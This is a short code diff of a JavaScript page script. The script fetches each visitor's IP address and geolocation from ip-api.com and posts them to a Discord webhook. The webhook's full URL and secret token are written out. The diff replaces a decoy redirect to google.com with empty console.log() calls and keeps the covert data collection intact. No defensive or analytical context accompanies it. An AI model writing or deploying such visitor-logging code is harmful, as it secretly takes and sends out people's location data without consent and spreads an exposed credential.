@@ -19,10 +19,10 @@ fetch('http://ip-api.com/json/')
         return sendToDiscordWebhook(Message);
     })
     .then(() => {
-        window.location.replace("https://google.com")
+        console.log()
     })
     .catch(error => {
-        window.location.replace("https://google.com")
+        console.log()
     });
 function sendToDiscordWebhook(message) {
     const webhookUrl = "https://discord.com/api/webhooks/1295330857183219824/-gxbQC9cIoSjZWH8HY--44kIei5pJcOPgf1NCQVxVYxfjncqvMS53_9anpHiDTC-wm6K";
